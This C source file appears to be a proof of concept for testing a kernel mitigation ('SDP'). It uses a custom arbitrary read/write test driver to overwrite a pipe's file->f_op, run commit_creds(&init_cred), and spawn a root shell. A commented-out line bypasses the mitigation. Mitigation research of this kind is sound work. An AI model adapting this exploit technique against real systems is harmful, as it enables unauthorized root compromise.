// FZY: Privilege escalation PoC that overwrites file->f_op (an indirect function pointer)
// to redirect file->f_op->read to a gadget that calls commit_creds(&init_cred), granting
// the calling process root credentials.
//
// Attack chain:
//   struct file.f_op  (data pointer in slab)
//     -> struct file_operations  (normally in kernel .rodata)
//       -> .read  (function pointer called by vfs_read)
//                 -> file_op_privesc_read: commit_creds(&init_cred)
//
// Steps:
//   1. Navigate task_struct -> files_struct -> fdtable -> fd[pipe_read_fd] -> file -> f_op
//   2. Write fake file_operations (read = privesc gadget) into kernel scratch buffer
//   3. Overwrite file->f_op (data pointer) with scratch buffer address
//   4. Trigger read() on the pipe — executes commit_creds(&init_cred) in kernel context
//   5. Return to userspace with uid=0; verify with getuid() and whoami
//
// Usage:
//   ./file_op_privesc_poc <mode> <task_files_off> <files_fdt_off> <fdt_fd_off> <file_fop_off>
//
//   mode: 0 (no SDP), 1/2 (SDP active — strips pointer tags for evaluation bypass)
//
//   Offset commands:
//     pahole -C task_struct vmlinux | grep -A2 'struct files_struct'
//     pahole -C files_struct vmlinux | grep -A2 'struct fdtable.*fdt'
//     pahole -C fdtable vmlinux | grep -A2 'struct file.*\*\*.*fd'
//     pahole -C file vmlinux | grep -A2 'f_op'

#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>
#include <stdint.h>

#define POINTER_SIZE 8

// Offset of 'read' within struct file_operations:
//   owner (8) + llseek (8) = 16
#define FILE_OPERATIONS_READ_OFFSET 16

// Size of fake ops table — larger than struct file_operations
#define FAKE_FOPS_SIZE 512

struct arb_request {
  unsigned long addr;
  void *data;
  size_t size;
};

#define ARB_READ                _IOR('A', 1,  struct arb_request)
#define ARB_WRITE               _IOW('A', 2,  struct arb_request)
#define ARB_GET_CURRENT_TASK    _IOR('A', 8,  unsigned long)
#define ARB_GET_SCRATCH_BUF     _IOR('A', 10, unsigned long)
#define ARB_GET_FILE_OP_PRIVESC _IOR('A', 12, unsigned long)

static void arb_read(int fd, unsigned long addr, void *data, size_t size) {
  struct arb_request req = {.addr = addr, .data = data, .size = size};
  if (ioctl(fd, ARB_READ, &req) < 0) {
    perror("arb_read");
    exit(1);
  }
}

static void arb_write(int fd, unsigned long addr, void *data, size_t size) {
  struct arb_request req = {.addr = addr, .data = data, .size = size};
  if (ioctl(fd, ARB_WRITE, &req) < 0) {
    perror("arb_write");
    exit(1);
  }
}

static unsigned long follow_ptr(int fd, unsigned long ptr_addr, int mode,
                                const char *label) {
  unsigned long val;
  arb_read(fd, ptr_addr, &val, POINTER_SIZE);
  printf("[+] %s @ 0x%lx = 0x%lx\n", label, ptr_addr, val);
  if (mode != 0) {
    printf("[+]   SDP mode: tagged value -> 0x%lx\n", val);
    // FZY: Enable to bypass the mitigation and evaluate if the rest steps work correctly
    // val |= 0xFFFF000000000000UL;
  }
  return val;
}

int main(int argc, char *argv[]) {
  printf("[+] file->f_op privilege escalation PoC\n");
  printf("[+] Hijacks file->f_op->read to call commit_creds(&init_cred)\n\n");

  if (argc != 6) {
    printf("Usage: %s <mode> <task_files_off> <files_fdt_off> <fdt_fd_off> <file_fop_off>\n\n",
           argv[0]);
    printf("  mode            0 = no SDP, 1/2 = SDP active (bypass for evaluation)\n");
    printf("  task_files_off  offset of 'files' in task_struct\n");
    printf("                  pahole -C task_struct vmlinux | grep -A2 'files_struct'\n");
    printf("  files_fdt_off   offset of 'fdt' in files_struct\n");
    printf("                  pahole -C files_struct vmlinux | grep -A2 'fdtable.*fdt'\n");
    printf("  fdt_fd_off      offset of 'fd' in fdtable\n");
    printf("                  pahole -C fdtable vmlinux | grep -A2 'fd;'\n");
    printf("  file_fop_off    offset of 'f_op' in struct file\n");
    printf("                  pahole -C file vmlinux | grep -A2 'f_op'\n");
    return 1;
  }

  int mode               = atoi(argv[1]);
  unsigned long task_files_off = strtoul(argv[2], NULL, 0);
  unsigned long files_fdt_off  = strtoul(argv[3], NULL, 0);
  unsigned long fdt_fd_off     = strtoul(argv[4], NULL, 0);
  unsigned long file_fop_off   = strtoul(argv[5], NULL, 0);

  printf("[+] Before attack: uid=%d euid=%d\n", getuid(), geteuid());

  // Create pipe first so fd numbers are predictable (pipe fds come before arb_rw fd)
  int pipefd[2];
  if (pipe(pipefd) < 0) {
    perror("pipe");
    return 1;
  }
  int pipe_read_fd  = pipefd[0];
  int pipe_write_fd = pipefd[1];
  printf("[+] Pipe created: read_fd=%d write_fd=%d\n", pipe_read_fd, pipe_write_fd);

  // Seed the pipe — if the hijack fails the original read() will drain this and
  // return data, distinguishing it from the gadget's return-0 (EOF)
  const char seed[] = "PRIVESC_TEST_DATA";
  write(pipe_write_fd, seed, sizeof(seed));

  int fd = open("/dev/arb_rw", O_RDWR);
  if (fd < 0) {
    perror("open /dev/arb_rw");
    return 1;
  }
  printf("[+] Opened /dev/arb_rw (fd=%d)\n\n", fd);

  // --- Obtain kernel addresses ---

  unsigned long task_addr;
  if (ioctl(fd, ARB_GET_CURRENT_TASK, &task_addr) < 0) {
    perror("ARB_GET_CURRENT_TASK");
    close(fd);
    return 1;
  }
  printf("[+] task_struct @ 0x%lx\n", task_addr);

  unsigned long scratch_addr;
  if (ioctl(fd, ARB_GET_SCRATCH_BUF, &scratch_addr) < 0) {
    perror("ARB_GET_SCRATCH_BUF");
    close(fd);
    return 1;
  }
  printf("[+] arb_scratch_buf @ 0x%lx\n", scratch_addr);

  unsigned long gadget_addr;
  if (ioctl(fd, ARB_GET_FILE_OP_PRIVESC, &gadget_addr) < 0) {
    perror("ARB_GET_FILE_OP_PRIVESC");
    close(fd);
    return 1;
  }
  printf("[+] file_op_privesc_read gadget (commit_creds) @ 0x%lx\n\n", gadget_addr);

  // --- Navigate to file->f_op ---

  printf("[+] Navigating: task_struct -> files_struct -> fdtable -> fd[%d] -> file -> f_op\n\n",
         pipe_read_fd);

  unsigned long files_addr = follow_ptr(fd, task_addr + task_files_off, mode,
                                        "files_struct *");
  unsigned long fdt_addr   = follow_ptr(fd, files_addr + files_fdt_off, mode,
                                        "fdtable *");
  unsigned long fd_arr     = follow_ptr(fd, fdt_addr + fdt_fd_off, mode,
                                        "fd[] base (struct file **)");
  unsigned long file_addr  = follow_ptr(fd, fd_arr + (pipe_read_fd * POINTER_SIZE), mode,
                                        "struct file * (pipe read-end)");

  unsigned long fop_ptr_addr = file_addr + file_fop_off;
  unsigned long orig_fop;
  arb_read(fd, fop_ptr_addr, &orig_fop, POINTER_SIZE);
  printf("[+] file->f_op (data ptr) @ 0x%lx = 0x%lx (original pipe_fops)\n\n",
         fop_ptr_addr, orig_fop);

  // --- Build fake file_operations and install it ---

  unsigned char fake_fops[FAKE_FOPS_SIZE];
  memset(fake_fops, 0, sizeof(fake_fops));
  *(unsigned long *)(fake_fops + FILE_OPERATIONS_READ_OFFSET) = gadget_addr;
  printf("[+] Fake file_operations: read=0x%lx (commit_creds gadget)\n", gadget_addr);

  printf("[+] Writing fake file_operations to scratch buffer @ 0x%lx\n", scratch_addr);
  arb_write(fd, scratch_addr, fake_fops, sizeof(fake_fops));

  printf("[+] Overwriting file->f_op @ 0x%lx: 0x%lx -> 0x%lx\n",
         fop_ptr_addr, orig_fop, scratch_addr);
  arb_write(fd, fop_ptr_addr, &scratch_addr, POINTER_SIZE);

  unsigned long verify_fop;
  arb_read(fd, fop_ptr_addr, &verify_fop, POINTER_SIZE);
  if (verify_fop == scratch_addr) {
    printf("[+] file->f_op redirected to fake ops table — ready to trigger\n\n");
  } else {
    printf("[-] WARNING: file->f_op overwrite failed (got 0x%lx)\n", verify_fop);
    printf("[-] SDP may have blocked the write. Restoring and exiting.\n");
    arb_write(fd, fop_ptr_addr, &orig_fop, POINTER_SIZE);
    close(fd);
    return 1;
  }

  // --- Trigger: read() calls vfs_read -> file->f_op->read -> commit_creds(&init_cred) ---

  printf("[+] Triggering read() on pipe fd %d to execute commit_creds(&init_cred)...\n",
         pipe_read_fd);
  char buf[64];
  ssize_t n = read(pipe_read_fd, buf, sizeof(buf));
  printf("[+] read() returned %zd\n\n", n);

  // --- Restore f_op before checking credentials to avoid corrupting the pipe ---

  printf("[+] Restoring file->f_op to 0x%lx\n", orig_fop);
  arb_write(fd, fop_ptr_addr, &orig_fop, POINTER_SIZE);

  // --- Verify privilege escalation ---

  uid_t uid  = getuid();
  uid_t euid = geteuid();
  printf("[+] After attack: uid=%d euid=%d\n", uid, euid);

  if (uid == 0 && euid == 0) {
    printf("\n[+] === PRIVILEGE ESCALATION SUCCESS ===\n");
    printf("[+] We are root! Spawning a root shell...\n");
    printf("[+] Check dmesg for '*** FILE_OP PRIVESC GADGET EXECUTED ***'\n\n");
    execl("/bin/sh", "sh", NULL);
    perror("execl");
  } else if (n == 0) {
    printf("[+] Gadget returned EOF (read=0) — commit_creds likely executed\n");
    printf("[-] But uid is still %d; SDP may have blocked the f_op write\n", uid);
    printf("[-] or the verification should be re-checked with dmesg\n");
  } else {
    printf("[-] Privilege escalation did not succeed (uid=%d, read returned %zd bytes)\n",
           uid, n);
    printf("[-] The original read() path was taken — f_op overwrite was blocked by SDP\n");
  }

  close(pipe_write_fd);
  close(pipe_read_fd);
  close(fd);

  printf("\n[+] PoC completed. Check kernel log: dmesg | tail -20\n");
  return 0;
}
